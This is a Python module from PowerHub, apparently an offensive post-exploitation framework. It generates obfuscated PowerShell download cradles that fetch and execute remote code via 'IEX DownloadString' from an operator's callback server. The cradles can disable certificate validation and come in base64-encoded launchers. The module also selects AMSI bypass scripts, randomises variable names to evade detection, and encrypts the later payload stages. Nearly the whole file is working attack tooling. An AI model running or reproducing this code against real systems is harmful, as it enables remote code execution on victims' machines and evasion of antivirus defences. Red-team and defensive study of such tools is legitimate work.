import base64
import binascii
import logging
import os
import random
import re
import string

from jinja2 import Environment, FileSystemLoader

from powerhub.tools import encrypt_rc4, encrypt_aes
from powerhub.directories import BASE_DIR
from powerhub.env import powerhub_app as ph_app


log = logging.getLogger(__name__)

symbol_list = {None: None}

callback_urls = {
    'http': 'http://%s:%d/%s' % (
        ph_app.args.URI_HOST,
        ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.LPORT,
        ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
    ),
    'https': 'https://%s:%d/%s' % (
        ph_app.args.URI_HOST,
        ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.SSL_PORT,
        ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
    ),
}

# TODO consider https
webdav_url = 'http://%s:%d/webdav' % (
    ph_app.args.URI_HOST,
    ph_app.args.LPORT,
)


def build_crade_https(get_args):
    result = ''

    if get_args['Transport'] == 'https':
        if get_args['NoVerification'] == 'true':
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={$true};")
        elif get_args['Fingerprint'] == 'true':
            from powerhub.reverseproxy import FINGERPRINT
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={param($1,$2);"
                       "$2.Thumbprint -eq '%s'};" %
                       FINGERPRINT.replace(':', ''))
        elif get_args['CertStore'] == 'true':
            pass
        if get_args['TLS1.2'] == 'true':
            result += ("[Net.ServicePointManager]::SecurityProtocol="
                       "[Net.SecurityProtocolType]::Tls12;")

    return result


def build_cradle_webclient(get_args, key):
    result = ''
    web_client = symbol_name('web_client')

    if get_args['Transport'].startswith('http'):
        result += "$%(web_client)s=New-Object Net.WebClient;"

        if get_args['Proxy'] == 'true':
            result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                       "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
                       "DefaultCredentials;")

        url = callback_urls[get_args['Transport']]

        query = "/?t=%(Transport)s&a=%(Amsi)s&k=%(KEX)s" % get_args
        if not get_args['ClipExec'] == 'none':
            query += "&c=%(ClipExec)s" % get_args['ClipExec']

        if get_args['Minimal'] == 'true':
            query += "&m=t"

        query = encrypt_aes(query, key)
        # Make b64 encoding urlsafe
        query = query.replace('/', '_').replace('+', '-')

        result += "IEX $%(web_client)s.DownloadString('%(url)s%(query)s')"
        result = result % dict(
            url=url,
            query=query,
            web_client=web_client,
        )

    return result


def build_cradle(get_args, key):
    """Build the download crade given a dict of GET arguments"""
    log.debug("GET arguments: %s" % get_args)

    result = ""
    key_var = symbol_name('global_key')

    result += build_crade_https(get_args)

    if get_args['KEX'] == 'oob' and key:
        result += "$%(key_var)s='%(key)s';"

    result += build_cradle_webclient(get_args, key)

    result = result % dict(
        url=callback_urls[get_args['Transport']],
        transport=get_args['Transport'],
        amsi=get_args['Amsi'],
        key_var=key_var,
        key=key,
    )

    # make sure to only use single quotes
    assert '"' not in result

    powershell_exe = 'powershell.exe'

    if get_args['Launcher'] == 'cmd':
        result = '%s "%s"' % (powershell_exe, result)
    elif get_args['Launcher'] == 'cmd_enc':
        result = '%s -Enc %s' % (
            powershell_exe,
            binascii.b2a_base64(result.encode('utf-16le')).decode())
    elif get_args['Launcher'] == 'bash':
        result = result.replace('$', '\\$')
        result = '"%s \\\"%s\\\""' % (powershell_exe, result)

    return result


def symbol_name(name):
    if name not in symbol_list:
        if ph_app.args.DEBUG:
            # In debug mode, don't obfuscate
            symbol_list[name] = name
        else:
            symbol_list[name] = choose_obfuscated_name()
    return symbol_list[name]


def debug(msg, dbg=False):
    """This is a function for debugging statements in jinja2 templates"""
    if dbg:
        return msg + ";"
    return ""


def choose_obfuscated_name():
    # TODO choose better names
    # the names should not contain too much entropy, or it will be
    # detectable. they should also not be too common or we will risk
    # collisions. they should just blend in perfectly.
    result = None
    length = random.choice(range(4, 8))
    while not result and result in list(symbol_list.values()):
        result = ''.join([random.choice(string.ascii_lowercase)
                          for i in range(length)])
        result = random.choice(string.ascii_uppercase) + result
    return result


# TODO add jinja include_randomize_whitespace
# TODO add jinja powershell decoys

def get_stage(key, amsi_bypass='reflection', jinja_context={}, stage3_files=[], stage3_strings=[]):
    if amsi_bypass:
        assert '/' not in amsi_bypass
        amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')
    else:
        amsi_bypass = ''

    context = {
        'symbol_name': symbol_name,
        'key': key,
        'amsibypass': amsi_bypass,
    }
    context.update(jinja_context)

    env = Environment(loader=FileSystemLoader(
        os.path.join(BASE_DIR, 'templates')
    ))

    def rc4encrypt(msg):
        return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()

    env.filters['rc4encrypt'] = rc4encrypt
    env.filters['debug'] = lambda msg: debug(msg, dbg=ph_app.args.DEBUG)

    stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))

    stage2_template = env.get_template(os.path.join('powershell', 'stage2.ps1'))
    stage2 = stage2_template.render(**context)
    stage2 = encrypt_rc4(stage2.encode(), key)
    stage2 = base64.b64encode(stage2).decode()

    stage3 = []
    for t in stage3_files + stage3_strings:
        if t in stage3_files:
            buffer = open(t, 'r').read()
        else:
            buffer = t
        buffer = encrypt_aes(buffer, key)
        stage3.append(buffer)

    context['stage2'] = stage2
    context['stage3'] = stage3

    result = stage1_template.render(**context)

    if not ph_app.args.DEBUG:
        result = remove_leading_whitespace(result)
        result = remove_blank_lines(result)

    return result


def remove_leading_whitespace(text):
    text = re.sub(r'\s+', ' ', text)
    return text


def remove_blank_lines(text):
    result = [
        line for line in text.splitlines() if line
    ]
    result = '\n'.join(result)
    return result
